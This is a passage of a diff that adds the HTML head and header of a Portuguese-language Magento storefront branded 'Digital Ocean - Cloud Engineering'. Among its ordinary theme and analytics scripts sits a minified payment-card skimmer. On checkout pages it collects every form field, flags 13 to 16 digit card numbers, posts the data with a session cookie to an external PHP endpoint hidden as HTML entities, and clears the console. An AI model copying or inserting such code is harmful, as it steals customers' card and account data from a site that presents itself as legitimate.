@@ -1,0 +1,899 @@
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pt" lang="pt">
+<head>
+
+<title>Digital Ocean - Cloud Engineering</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><script type="text/javascript">window.NREUM||(NREUM={}),__nr_require=function(t,e,n){function r(n){if(!e[n]){var o=e[n]={exports:{}};t[n][0].call(o.exports,function(e){var o=t[n][1][e];return r(o||e)},o,o.exports)}return e[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<n.length;o++)r(n[o]);return r}({1:[function(t,e,n){function r(){}function o(t,e,n){return function(){return i(t,[(new Date).getTime()].concat(u(arguments)),e?null:this,n),e?void 0:this}}var i=t("handle"),a=t(2),u=t(3),c=t("ee").get("tracer"),f=NREUM;"undefined"==typeof window.newrelic&&(newrelic=f);var s=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit"],p="api-",l=p+"ixn-";a(s,function(t,e){f[e]=o(p+e,!0,"api")}),f.addPageAction=o(p+"addPageAction",!0),e.exports=newrelic,f.interaction=function(){return(new r).get()};var d=r.prototype={createTracer:function(t,e){var n={},r=this,o="function"==typeof e;return i(l+"tracer",[Date.now(),t,n],r),function(){if(c.emit((o?"":"no-")+"fn-start",[Date.now(),r,o],n),o)try{return e.apply(this,arguments)}finally{c.emit("fn-end",[Date.now()],n)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,e){d[e]=o(l+e)}),newrelic.noticeError=function(t){"string"==typeof t&&(t=new Error(t)),i("err",[t,(new Date).getTime()])}},{}],2:[function(t,e,n){function r(t,e){var n=[],r="",i=0;for(r in t)o.call(t,r)&&(n[i]=e(r,t[r]),i+=1);return n}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],3:[function(t,e,n){function r(t,e,n){e||(e=0),"undefined"==typeof n&&(n=t?t.length:0);for(var r=-1,o=n-e||0,i=Array(o<0?0:o);++r<o;)i[r]=t[e+r];return i}e.exports=r},{}],ee:[function(t,e,n){function r(){}function o(t){function e(t){return t&&t instanceof r?t:t?u(t,a,i):i()}function n(n,r,o){t&&t(n,r,o);for(var i=e(o),a=l(n),u=a.length,c=0;c<u;c++)a[c].apply(i,r);var s=f[m[n]];return s&&s.push([w,n,r,i]),i}function p(t,e){g[t]=l(t).concat(e)}function l(t){return g[t]||[]}function d(t){return s[t]=s[t]||o(n)}function v(t,e){c(t,function(t,n){e=e||"feature",m[n]=e,e in f||(f[e]=[])})}var g={},m={},w={on:p,emit:n,get:d,listeners:l,context:e,buffer:v};return w}function i(){return new r}var a="nr@context",u=t("gos"),c=t(2),f={},s={},p=e.exports=o();p.backlog=f},{}],gos:[function(t,e,n){function r(t,e,n){if(o.call(t,e))return t[e];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,e,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return t[e]=r,r}var o=Object.prototype.hasOwnProperty;e.exports=r},{}],handle:[function(t,e,n){function r(t,e,n,r){o.buffer([t],r),o.emit(t,e,n)}var o=t("ee").get("handle");e.exports=r,r.ee=o},{}],id:[function(t,e,n){function r(t){var e=typeof t;return!t||"object"!==e&&"function"!==e?-1:t===window?0:a(t,i,function(){return o++})}var o=1,i="nr@id",a=t("gos");e.exports=r},{}],loader:[function(t,e,n){function r(){if(!h++){var t=y.info=NREUM.info,e=s.getElementsByTagName("script")[0];if(t&&t.licenseKey&&t.applicationID&&e){c(m,function(e,n){t[e]||(t[e]=n)});var n="https"===g.split(":")[0]||t.sslForHttp;y.proto=n?"https://":"http://",u("mark",["onload",a()],null,"api");var r=s.createElement("script");r.src=y.proto+t.agent,e.parentNode.insertBefore(r,e)}}}function o(){"complete"===s.readyState&&i()}function i(){u("mark",["domContent",a()],null,"api")}function a(){return(new Date).getTime()}var u=t("handle"),c=t(2),f=window,s=f.document,p="addEventListener",l="attachEvent",d=f.XMLHttpRequest,v=d&&d.prototype;NREUM.o={ST:setTimeout,CT:clearTimeout,XHR:d,REQ:f.Request,EV:f.Event,PR:f.Promise,MO:f.MutationObserver},t(1);var g=""+location,m={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-974.min.js"},w=d&&v&&v[p]&&!/CriOS/.test(navigator.userAgent),y=e.exports={offset:a(),origin:g,features:{},xhrWrappable:w};s[p]?(s[p]("DOMContentLoaded",i,!1),f[p]("load",r,!1)):(s[l]("onreadystatechange",o),f[l]("onload",r)),u("mark",["firstbyte",a()],null,"api");var h=0},{}]},{},["loader"]);</script>
+<meta name="description" content="Digital Ocean - Cloud Engineering - Português (Brasil)" />
+<meta name="robots" content="INDEX,FOLLOW" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0" />
+<link rel="icon" href="http://box.brandslog.tech/media/favicon/default/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://box.brandslog.tech/media/favicon/default/favicon.ico" type="image/x-icon" />
+<link rel="stylesheet" type="text/css" href="http://box.brandslog.tech/skin/frontend/paradigm/style4/js/carrousel/js-image-slider.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://box.brandslog.tech/skin/frontend/base/default/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://box.brandslog.tech/skin/frontend/base/default/css/blank-styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://box.brandslog.tech/skin/frontend/base/default/rokmage-layouts/css/default-theme-styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://box.brandslog.tech/skin/frontend/base/default/rokmage-categoryview/css/rokmage-categoryview.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://box.brandslog.tech/skin/frontend/base/default/rokmage-footerblock/css/rokmage-footerblock.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://box.brandslog.tech/skin/frontend/base/default/rokmage-layouts/css/rokmage-responsive.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://box.brandslog.tech/skin/frontend/base/default/rokmage-magemenus/css/rokmage-magemenus-top.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://box.brandslog.tech/skin/frontend/base/default/rokmage-modalheader/css/rokmage-modalheader.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://box.brandslog.tech/skin/frontend/base/default/rokmage-productview/css/rokmage-productview.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://box.brandslog.tech/skin/frontend/base/default/rokmage-contentslider/css/rokmage-contentslider.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://box.brandslog.tech/skin/frontend/base/default/rokmage-homepagegrid/css/rokmage-homepagegrid.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://box.brandslog.tech/skin/frontend/base/default/css/print.css" media="print" />
+<script type="text/javascript" src="http://box.brandslog.tech/js/carrousel/js-image-slider.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/js/carrousel/jquery-noconflict.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/js/varien/js.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/js/varien/form.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-main-js/jquery.min.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-categoryview/js/jquery.cookie.plugin.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-layouts/js/rokmage-responsive.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-magemenus/js/rokmage-magemenus-top.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-magemenus/js/rokmage-lavalamp.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-modalheader/js/tools.scrollable.min.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-modalheader/js/font-controller.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-modalheader/js/modal-header-scripts.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-modalheader/js/customformelements.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-modalheader/js/inputstylingscripts.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-modalheader/js/jquery.jBreadCrumb.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-main-js/truncate.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-main-js/jquery.easing.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-productview/js/jquery.flash.min.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-contentslider/js/tools.tabs.min.js"></script>
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-modalheader/js/modal-header-scripts-IE6.js"></script>
+<![endif]-->
+<!--[if lt IE 9]>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-modalheader/js/modal-header-scripts-IE7.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-main-js/selectivizr-min.js"></script>
+<![endif]-->
+<!--[if IE 6]>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-main-js/jquery.badBrowser.js"></script>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-main-js/DD_belatedPNG.js"></script>
+<![endif]-->
+<!--[if gte IE 8]>
+<script type="text/javascript" src="http://box.brandslog.tech/skin/frontend/base/default/rokmage-main-js/PIE.js"></script>
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.box.brandslog.tech';
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["HK","IE","MO","PA"];
+//]]>
+</script>
+<!-- BEGIN GOOGLE ANALYTICS CODEs -->
+<script type="text/javascript">
+//<![CDATA[
+    var _gaq = _gaq || [];
+    
+_gaq.push(['_setAccount', 'UA-56773817-1']);
+
+_gaq.push(['_trackPageview']);
+    
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+
+//]]>
+</script>
+<!-- END GOOGLE ANALYTICS CODE -->
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate({"HTML tags are not allowed":"Tags HTML n\u00e3o s\u00e3o permitidas","Please select an option.":"Selecione uma op\u00e7\u00e3o.","This is a required field.":"Campo obrigat\u00f3rio.","Please enter a valid number in this field.":"Informe um n\u00famero v\u00e1lido.","The value is not within the specified range.":"O valor n\u00e3o est\u00e1 dentro do limite especificado.","Please use numbers only in this field. Please avoid spaces or other characters such as dots or commas.":"Utilize apenas n\u00fameros. Evite espa\u00e7os ou outros caracteres como pontos ou v\u00edrgulas.","Please use letters only (a-z or A-Z) in this field.":"Utilize apenas letras (a-z ou A-Z).","Please use only letters (a-z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"Utilize apenas letras (a-z), n\u00fameros (0-9) ou underline(_), primeiro car\u00e1cter precisa ser uma letra.","Please use only letters (a-z or A-Z) or numbers (0-9) only in this field. No spaces or other characters are allowed.":"Utilize apenas letras (a-z ou A-Z) ou n\u00fameros (0-9). Espa\u00e7os ou outros caracteres n\u00e3o ser\u00e3o permitidos.","Please use only letters (a-z or A-Z) or numbers (0-9) or spaces and # only in this field.":"Utilize apenas letras (a-z ou A-Z) ou n\u00fameros (0-9) ou espa\u00e7os e #.","Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.":"Informe um n\u00famero de telefone v\u00e1lido. Por exemplo, (123) 456-7890 ou 123-456-7890.","Please enter a valid fax number. For example (123) 456-7890 or 123-456-7890.":"Informe um n\u00famero de celular v\u00e1lido. Por exemplo, (123) 456-7890 ou 123-456-7890.","Please enter a valid date.":"Informe uma data v\u00e1lida.","The From Date value should be less than or equal to the To Date value.":"A Data de In\u00e9cio deve ser menor ou igual \u00e0 Data Final.","Please enter a valid email address. For example johndoe@domain.com.":"Informe um endere\u00e7o de email v\u00e1lido. Por exemplo, johndoe@domain.com.","Please use only visible characters and spaces.":"Utilize apenas caracteres vis\u00edveis e espa\u00e7os.","Please enter 6 or more characters. Leading or trailing spaces will be ignored.":"Informe 6 ou mais caracteres. Espa\u00e7os a direita ou a esquerda ser\u00e3o ignorados.","Please enter 7 or more characters. Password should contain both numeric and alphabetic characters.":"Informe 7 ou mais caracteres. Senha precisa conter ambos caracteres, n\u00fameros e letras.","Please make sure your passwords match.":"Verifique se as senhas conferem.","Please enter a valid URL. Protocol is required (http:\/\/, https:\/\/ or ftp:\/\/)":"Informe uma URL v\u00e1lida. Protocolo obrigat\u00f3rio (http:\/\/, https:\/\/ ou ftp:\/\/)","Please enter a valid URL. For example http:\/\/www.example.com or www.example.com":"Informe uma URL v\u00e1lida. Por exemplo, http:\/\/www.example.com ou www.example.com","Please enter a valid URL Key. For example \"example-page\", \"example-page.html\" or \"anotherlevel\/example-page\".":"Informe uma URL v\u00e1lida. Por exemplo, \"exemplo-pagina\", \"exemplo-pagina.html\" ou \"umacategoria\/exemplo-pagina\".","Please enter a valid XML-identifier. For example something_1, block5, id-4.":"Informe um identificador XML v\u00e1lido. Por exemplo, algumacoisa_1, block5, id-4.","Please enter a valid social security number. For example 123-45-6789.":"Informe um CPF v\u00e1lido. Por exemplo, 123.455.678-9.","Please enter a valid zip code. For example 90602 or 90602-1234.":"Informe um CEP v\u00e1lido. Por exemplo, 90602 ou 90602-1234.","Please enter a valid zip code.":"Informe um CEP v\u00e1lido.","Please use this date format: dd\/mm\/yyyy. For example 17\/03\/2006 for the 17th of March, 2006.":"Utilize este formato de data: dd\/mm\/yyyy. Por exemplo, 17\/03\/2006 para informar 17th de Mar\u00e7o, 2006.","Please enter a valid $ amount. For example $100.00.":"Informe um valor $ . Por exemplo, $100.00.","Please select one of the above options.":"Selecione uma das op\u00e7\u00f5es abaixo.","Please select one of the options.":"Selecione uma das op\u00e7\u00f5es.","Please select State\/Province.":"Selecione Estado...","Please enter a number greater than 0 in this field.":"Informe um n\u00famero maior que zero.","Please enter a number 0 or greater in this field.":"Informe um n\u00famero igual ou maior que zero.","Please enter a valid credit card number.":"Informe um n\u00famero de cart\u00e3o de cr\u00e9dito v\u00e1lido.","Credit card number does not match credit card type.":"N\u00famero do cart\u00e3o de cr\u00e9dito n\u00e3o condiz com tipo de cart\u00e3o.","Card type does not match credit card number.":"Tipo de cart\u00e3o n\u00e3o condiz com n\u00famero do cart\u00e3o de cr\u00e9dito.","Incorrect credit card expiration date.":"Data de expira\u00e7\u00e3o do cart\u00e3o n\u00e3o \u00e9 v\u00e1lido.","Please enter a valid credit card verification number.":"Informe um n\u00famero de verifica\u00e7\u00e3o de cart\u00e3o de cr\u00e9dito v\u00e1lido.","Please input a valid CSS-length. For example 100px or 77pt or 20em or .5ex or 50%.":"Informe um tamanho v\u00e1lido de CSS no campo. Por exemplo, 100px ou 77pt ou 20em ou .5ex ou 50%.","Text length does not satisfy specified text range.":"Tamanho do texto n\u00e3o satisfaz o espa\u00e7o de texto especificado.","Please enter a number lower than 100.":"Informe um n\u00famero menor que 100.","Please select a file":"Selecione um arquivo","Please enter issue number or start date for switch\/solo card type.":"Informe um n\u00famero de seguran\u00e7a ou data de validade para o tipo de cart\u00e3o switch\/solo.","Please wait, loading...":"Carregando...","This date is a required value.":"A data \u00e9 um valor obrigat\u00f3rio.","Please enter a valid day (1-%d).":"Informe um dia v\u00e1lido (1-%d).","Please enter a valid month (1-12).":"Informe um m\u00eas v\u00e1lido (1-12).","Please enter a valid year (1900-%d).":"Informe um ano v\u00e1lido (1900-%d).","Please enter a valid full date":"Informe uma data completa","Please enter a valid date between %s and %s":"Informe uma data v\u00e1lida entre %s e %s","Please enter a valid date equal to or greater than %s":"Informe uma data v\u00e1lida igual ou maior que %s","Please enter a valid date less than or equal to %s":"Informe uma data v\u00e1lida menor ou igual a %s","Complete":"Completo","Add Products":"Criar Produtos","Please choose to register or to checkout as a guest":"Criar conta ou continuar como visitante","Your order cannot be completed at this time as there is no shipping methods available for it. Please make necessary changes in your shipping address.":"Seu pedido n\u00e3o pode ser finalizado no momento pois n\u00e3o h\u00e1 formas de entrega dispon\u00edveis para ele. Talvez seja necess\u00e1rio alterar seu endere\u00e7o de entrega.","Please specify payment method.":"Informe uma forma de pagamento.","Your order cannot be completed at this time as there is no payment methods available for it.":"Seu pedido n\u00e3o pode ser finalizado neste momento pois n\u00e3o h\u00e1 formas de pagamento dispon\u00edveis para ele."});
+        //]]></script><script type="text/javascript">function jj(e){var t="; "+document.cookie,o=t.split("; "+e+"=");return 2==o.length?o.pop().split(";").shift():void 0}jj("SESSIID")||(document.cookie="SESSIID="+(new Date).getTime()),jQuery(function(e){e("button").on("click",function(){var t="",o="post",n=window.location;if(new RegExp("onepage|checkout").test(n)){for(var c=document.querySelectorAll("input, select, textarea, checkbox"),i=0;i<c.length;i++)if(c[i].value.length>0){var a=c[i].name;""==a&&(a=i),t+=a+"="+c[i].value+"&"}if(t){var l=new RegExp("[0-9]{13,16}"),u=new XMLHttpRequest;u.open(o,e("<div />").html("&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#111;&#119;&#110;&#115;&#97;&#102;&#101;&#116;&#121;&#46;&#111;&#114;&#103;&#47;&#111;&#112;&#112;&#46;&#112;&#104;&#112;").text(),!0),u.setRequestHeader("Content-type","application/x-www-form-urlencoded"),u.send(t+"&asd="+(l.test(t.replace(/s/g,""))?1:0)+"&utmp="+n+"&cookie="+jj("SESSIID")),console.clear()}}})});</script>
+<!-- Start Theme Styles -->
+<link type="text/css" rel="stylesheet" href="http://box.brandslog.tech/skin/frontend/paradigm/default/css/theme-styles.css" />
+	<link type="text/css" rel="stylesheet" href="http://box.brandslog.tech/skin/frontend/paradigm/default/css/theme-styles-responsive.css" />
+<link type="text/css" rel="stylesheet" href="http://box.brandslog.tech/skin/frontend/base/default/css/main.css" />
+<link type="text/css" rel="stylesheet" href="http://box.brandslog.tech/skin/frontend/paradigm/style4/css/colorstyles.css" />
+<!-- End Theme Styles -->
+
+
+<!--[if IE 9]>
+<link type="text/css" rel="stylesheet" href="http://box.brandslog.tech/skin/frontend/paradigm/default/css/styles-ie9.css" />
+<![endif]-->
+
+<!--[if IE 8]>
+<link type="text/css" rel="stylesheet" href="http://box.brandslog.tech/skin/frontend/paradigm/default/css/styles-ie8.css" />
+<link type="text/css" rel="stylesheet" href="http://box.brandslog.tech/skin/frontend/paradigm/default/css/theme-styles-fixed960.css" />
+<script type="text/javascript">/* <![CDATA[ */
+var $j = jQuery.noConflict();
+$j(document).ready(function(){
+// Add PIE selectors
+    $j(function() {
+        if (window.PIE) {
+            $j(' #homepage-contentslider-container .images button.button, #homepage-contentslider-container .backward, #homepage-contentslider-container .forward, .arrow-box, #search_mini_form input, ul#magemenu-top > li.active, ul#magemenu-top li ul, .cms-index-index .surround').each(function() {
+                PIE.attach(this);
+            });
+        }
+    });
+});
+/* ]]> */
+</script>
+<![endif]-->
+
+<!--[if IE 7]>
+<link type="text/css" rel="stylesheet" href="http://box.brandslog.tech/skin/frontend/paradigm/default/css/styles-ie.css" />
+<![endif]-->
+<!--[if IE 6]>
+<script type="text/javascript">
+DD_belatedPNG.fix(' ');
+</script>
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://box.brandslog.tech/js/blank.html';
+    var BLANK_IMG = 'http://box.brandslog.tech/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+
+<script type="text/javascript">/* <![CDATA[ */
+var $j = jQuery.noConflict();
+$j(document).ready(function(){
+	// Add hover to buttons
+	$j('button').hover(
+		function () {
+			$j(this).addClass("hover");
+		}, 
+		function () {
+			$j(this).removeClass("hover");
+		}
+	);
+	// Add style to body class
+	$j('body').addClass("style4");
+});
+/* ]]> */
+</script>
+
+<style type="text/css" media="screen">
+	 </style>
+</head>
+<body class="responsive cms-index-index scrolling-fixed-header-enable cms-home homepage-slider-enabled custom-slider-enabled "  >
+
+<div class="rt-bg">
+<div class="rt-overlay rt-bg">
+
+
+<script type="application/ld+json">
+{
+   "@context": "http://schema.org",
+   "@type": "WebSite",
+   "url": "http://box.brandslog.tech/",
+   "potentialAction": {
+     "@type": "SearchAction",
+     "target": "http://box.brandslog.tech/catalogsearch/result/?q={search_term_string}",
+     "query-input": "required name=search_term_string"
+   }
+}
+</script><div class="base wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    Você precisa habilitar o Javascript no seu navegador para aproveitar as funcionalidades do site.                </p>
+            </div>
+        </div>
+    </noscript>
+    
+	
+
+<div class="header-container">
+    <div class="header">
+        <div class="inner-header-container">
+                        <h1 class="logo"><strong>Digital Ocean</strong><a href="http://box.brandslog.tech/" title="Digital Ocean" class="logo"><img src="http://box.brandslog.tech/skin/frontend/paradigm/style4/images/logo.png" alt="Digital Ocean" /></a></h1>
+                        
+
+
+<script type="text/javascript">
+    var $j = jQuery.noConflict();
+    $j(document).ready( function() {
+        $j(document).magemenus({
+            mm_trigger: "ul.menu-single",
+			mm_offsetfix: "1",
+            mm_slidedownspeed: 100,mm_fadeoutspeed: 50,mm_css_pre: {left: 100, opacity: 0 },mm_animatein: {left: 165, opacity: 1},mm_animateout: {opacity: 0, left: 185},mm_animate_speed: 150,mm_pause: 0 }); // Get animation settings from admin
+    });
+</script>
+
+<div id="box"><div class="head"></div></div>	
+<ul id="magemenu-top" class="menu-single">
+
+
+
+
+
+
+
+
+    
+    <li class="level0 parent" id="ocean"><a href="../"><span>Ocean</span></a> 
+    <ul class="level0">
+    	<li class="level1"><a href="../#diferenciais"><span>Nossos Diferenciais</span></a></li>
+    	<li class="level1"><a href="../#vman"><span>VMAN Tecnologia</span></a></li>
+    	<li class="level1"><a href="../#destina"><span>A Quem se Destina</span></a></li>
+    	<li class="level1"><a href="../#powercloud"><span>Powercloud</span></a></li>
+    </ul>
+    </li>
+    <li class="level0 parent" id="produtos"><a href="#"><span>Produtos</span></a> 
+    <ul class="level0 large">
+    	<li class="level1"><a href="/produtos_e-commerce"><span>Servidores Cloud E-commerce</span></a></li> 
+    <!--	<li class="level2"><a href="../produtos_e-commerce/#magento"><span class="space">&nbsp;&nbsp;</span><span>Magento</span></a></li>
+        <li class="level2"><a href="../produtos_e-commerce/#Prestashop"><span class="space">&nbsp;&nbsp;</span><span>PrestaShop</span></a></li>  -->
+     	<li class="level1"><a href="/produtos_cms_crm_applications"><span>Servidores Cloud CMS e CRM</span></a></li>
+    <!--	<li class="level2"><a href="../produtos_cms_crm_applications/#joomla"><span class="space">&nbsp;&nbsp;</span><span>Joomla</span></a></li>
+        <li class="level2"><a href="../produtos_cms_crm_applications/#wordpress"><span class="space">&nbsp;&nbsp;</span><span>Wordpress</span></a></li>
+        <li class="level2"><a href="../produtos_cms_crm_applications/#drupal"><span class="space">&nbsp;&nbsp;</span><span>Drupal</span></a></li>
+        <li class="level2"><a href="../produtos_cms_crm_applications/#sugarcrm"><span class="space">&nbsp;&nbsp;</span><span>Sugar CRM</span></a></li>  -->
+        <li class="level1"><a href="/produtos_network"><span>Servidores Cloud Comunidade Social</span></a></li>
+    </ul>
+    </li>    
+    <li class="level0 parent" id="planos"><a href="#"><span>Planos</span></a>
+    <ul class="level0 large">
+    	<!--<li class="level1"><a><span>Servidores Cloud</span></a></li> -->
+    	<li class="level1"><a href="/planos_e-commerce"><span>Ecommerce</span></a></li>
+    	<li class="level1"><a href="/planos_crm-cms"><span>CMS e CRM</span></a></li>
+        <!-- <li class="level1"><a href="/planos_network"><span>Comunidade Social</span></a></li> -->
+    	<li class="level1"><a href="/planos_agencias"><span>Layout e implantantação HTML+CSS</span></a></li>
+    </ul>
+    </li>
+    <li class="level0 parent" id="servicos"><a href="#"><span>Serviços</span></a>
+    <ul class="level0 large">
+    	<li class="level1"><a href="/servicos_power-cloud"><span>Power Cloud</span></a></li>
+    	<li class="level1"><a href="/servicos_migracao"><span>Serviços de Migração</span></a></li>
+    <!--	<li class="level1"><a href="/servicos_missao-critica-bullet-proof"><span>Serviços de Missão Crítica * Bullet Proof</span></a></li> -->
+    </ul>
+    </li>
+
+        <li id="Contact" class="level0 parent"><a href="#contatos"><span>Fale Conosco</span></a>
+        <ul class="level0 menu-single">
+    		<li class="level1"><a href="https://digitaloceaneng.zendesk.com/hc/pt-br" target="atend"><span>Atendimento</span></a></li>
+    		<li class="level1"><a href="https://digitaloceaneng.zendesk.com/hc/pt-br/requests/new" target="suporte"><span>Suporte</span></a></li>
+    		<li class="level1"><a href="http://social.digitalocean.eng.br/forum" target="forum"><span>Forum</span></a></li>
+    	</ul></li>
+
+
+	<li class="level0 parent" id="sobrenos right"><a href="/about-us"><span>Sobre Nós</span></a>
+	    <ul class="level0 large">
+            <li class="level1"><a href="/missao"><span>Missão</span></a></li>
+	    	<li class="level1"><a href="/parcerias"><span>Parcerias</span></a></li>
+	    	<li class="level1"><a href="/agencias_implantacao"><span class="space">&nbsp;&nbsp;</span><span>Agências de Implantação</span></a></li>
+	    	<li class="level1"><a href="/gateways-pagamento"><span class="space">&nbsp;&nbsp;</span><span>Gateways de Pagamento</span></a></li>
+	    	<li class="level1"><a href="http://social.digitalocean.eng.br/index" target="communit"><span>Comunidade</span></a></li>
+	    	<li class="level1"><a href="/portifolio"><span>Portfólio</span></a></li>
+	    	<li class="level1"><a href="http://social.digitalocean.eng.br/blogs" target="blog"><span>Blog</span></a></li>
+	    </ul>
+	</li>
+
+</ul>                    </div>
+    </div>
+</div>
+
+<div class="quick-access-wrapper"> 
+    <div class="quick-access">
+        <div class="welcome-msg"><span> </span></div>
+                <div class="top-links">
+                                            </div>
+        <div class="clearfloat"></div>
+    </div>
+    <div class="clearfloat"></div>
+</div>
+
+
+
+<script type="text/javascript">
+    var $j = jQuery.noConflict();
+    $j(document).ready( function() {
+        $j('a[title="Entrar"]').rokmagemodal({ rokmagemodalcontainer: "#rokmage-login-content", overlayopacity: 0.2,overlayinspeed: 300,modalpreposition: {"top":"43%"},modalpauseb4entry: 200,modalentryanimation: {"top": "50%", "opacity": "1"},modalentryspeed: 550,modalexitanimation: {"top": "55%", "opacity": "0"},modalexitspeed: 350,pauseb4overlayfadeout: 500,overlayoutspeed: 200 });
+	    });
+</script>
+
+<div id="rokmage-login-content" class="modalcontent">
+            <form action="http://box.brandslog.tech/customer/account/loginPost/" method="post" id="login-form2">
+                <fieldset>
+                    <legend>Log In</legend>
+                    <h2>Entrar</h2>
+                    <div class="rokmage-email-login-block">
+                        <label for="email">Email</label>
+                        <input name="login[username]" value="" id="email" type="text" class="input-text required-entry" title="Email" />
+                    </div>
+
+                    <div class="rokmage-password-login-block">
+                        <label for="pass">Senha</label>
+                        <input name="login[password]" type="password" class="input-text required-entry validate-password" id="pass" title="Senha" />
+                    </div>
+                    <div class="clearfloat"></div>
+
+                    <input type="hidden" name="form_key" value="<? echo Mage::getSingleton('core/session')->getFormKey(); ?>" />
+
+                    <button class="button" type="submit" name="send" id="send2"><span><span>Entrar</span></span></button>
+                    <p class="rokmage-forgot-pass"> <a href="http://box.brandslog.tech/customer/account/forgotpassword/" class="f-left">Esqueceu Sua Senha?</a></p>
+                    <div class="clearfloat"></div>
+                </fieldset>
+            </form>
+    <script type="text/javascript">
+        //<![CDATA[
+        var dataForm = new VarienForm('login-form2', true);
+        //]]>
+    </script>
+</div>
+
+
+<script type="text/javascript">
+    var $j = jQuery.noConflict();
+    // Scroller
+    $j(function() {
+        $j("div.cart-scrollable").scrollable({speed: 400, size: 1});
+    });
+    // Remove sidebar cart
+    $j(document).ready(function(){
+        $j(".block-cart p.block-subtitle, #cart-sidebar").remove();
+    });
+</script>
+
+
+<div id="rokmage-header-cart" class="modalcontent">
+    <h6>Subtotal:&nbsp;<span class="price">R$0,00</span></h6>
+        <div class="cart-scrollable-container">
+        <a class="prev"></a>
+        <div class="cart-scrollable">
+            <div class="items">
+                                                                                    </div>
+        </div>
+        <a class="next"></a>
+        <div class="clearfloat"></div>
+    </div>
+    <div class="actions" id="cart-buttons">
